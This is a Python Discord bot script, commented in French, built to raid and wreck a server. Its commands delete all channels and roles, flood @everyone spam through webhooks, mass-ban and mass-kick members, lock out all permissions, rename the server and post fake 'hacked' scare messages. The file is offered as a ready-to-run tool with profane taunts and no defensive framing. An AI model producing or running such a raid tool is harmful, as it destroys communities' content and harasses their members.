import discord
from discord.ext import commands
import asyncio
import aiohttp
import random
import json

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents, self_bot=False)

# CONFIG - METS TON TOKEN CONNARD
TOKEN = 'TON_TOKEN_ICI'

@bot.event
async def on_ready():
    print(f'{bot.user} PRÊT À DÉTRUIRE')

# FONCTION NUKE COMPLÈTE
@bot.command()
async def nuke(ctx):
    """Destruction totale du serveur"""
    guild = ctx.guild
    
    # 1. SUPPRIME TOUS LES SALONS
    for channel in guild.channels:
        try:
            await channel.delete()
            await asyncio.sleep(0.7)
        except:
            continue
    
    # 2. CRÉE 100 SALONS DE SPAM
    for i in range(100):
        try:
            new_channel = await guild.create_text_channel(f'raided-by-skid-{i}')
            webhook = await new_channel.create_webhook(name="RaidHook")
            
            # SPAM LES WEBHOOKS
            spam_content = ["@everyone SERVEUR RAIDED", "GET FUCKED", "SERVER NUKED"]
            for _ in range(5):
                await webhook.send(random.choice(spam_content))
                await asyncio.sleep(0.3)
        except:
            continue
    
    # 3. RENOMME LE SERVEUR
    try:
        await guild.edit(name="SERVER NUKED BY NOOBS")
    except:
        pass
    
    # 4. CHANGE L'ICÔNE
    try:
        with open('nuke.png', 'rb') as f:
            await guild.edit(icon=f.read())
    except:
        pass

# FONCTION BAN MASSIF
@bot.command()
async def massban(ctx):
    """Ban tous les membres"""
    guild = ctx.guild
    for member in guild.members:
        if member != bot.user:
            try:
                await member.ban(reason="MASS BAN RAID")
                await asyncio.sleep(0.5)
            except:
                continue

# FONCTION KICK MASSIF
@bot.command()
async def masskick(ctx):
    """Kick tous les membres"""
    guild = ctx.guild
    for member in guild.members:
        if not member.guild_permissions.administrator:
            try:
                await member.kick(reason="MASS KICK RAID")
                await asyncio.sleep(0.5)
            except:
                continue

# FONCTION SPAM RÔLES
@bot.command()
async def spamroles(ctx):
    """Crée 50 rôles"""
    guild = ctx.guild
    for i in range(50):
        try:
            await guild.create_role(name=f"RAIDED ROLE {i}", color=discord.Color.random())
            await asyncio.sleep(0.3)
        except:
            continue

# FONCTION DESTRUCTION RÔLES
@bot.command()
async def deleteroles(ctx):
    """Supprime tous les rôles"""
    guild = ctx.guild
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                await asyncio.sleep(0.4)
            except:
                continue

# FONCTION SPAM DE SALONS
@bot.command()
async def spamchannels(ctx, amount: int = 50):
    """Spam des salons textuels"""
    guild = ctx.guild
    for i in range(amount):
        try:
            await guild.create_text_channel(f"raided-channel-{i}")
            await asyncio.sleep(0.3)
        except:
            continue

# FONCTION DÉSACTIVER SERVEUR
@bot.command()
async def lockdown(ctx):
    """Désactive toutes les permissions"""
    guild = ctx.guild
    
    # Désactive @everyone
    default_role = guild.default_role
    try:
        await default_role.edit(permissions=discord.Permissions.none())
    except:
        pass
    
    # Change toutes les permissions des salons
    for channel in guild.channels:
        try:
            await channel.set_permissions(default_role, read_messages=False, send_messages=False)
            await asyncio.sleep(0.2)
        except:
            continue

# FONCTION SCARY MODE
@bot.command()
async def scare(ctx):
    """Envoie des messages effrayants dans tous les salons"""
    messages = [
        "@everyone SERVER HAS BEEN HACKED",
        "YOUR DATA IS BEING STOLEN",
        "ADMIN CREDENTIALS LEAKED",
        "INJECTING MALWARE",
        "DATABASE CORRUPTED"
    ]
    
    for channel in ctx.guild.text_channels:
        try:
            for msg in messages:
                await channel.send(msg)
                await asyncio.sleep(0.5)
        except:
            continue

# FONCTION NUKE AVEC WEBHOOKS
@bot.command()
async def webhooknuke(ctx):
    """Nuke avec webhooks avancés"""
    guild = ctx.guild
    
    # Crée des webhooks dans chaque salon
    for channel in guild.text_channels:
        try:
            webhook = await channel.create_webhook(name="NUKED")
            
            # Spam avec le webhook
            for i in range(10):
                await webhook.send(f"@everyone **SERVER RAIDED** #{i}")
                await asyncio.sleep(0.3)
        except:
            continue

# LANCE LE BOT
bot.run(TOKEN)
# gxmr
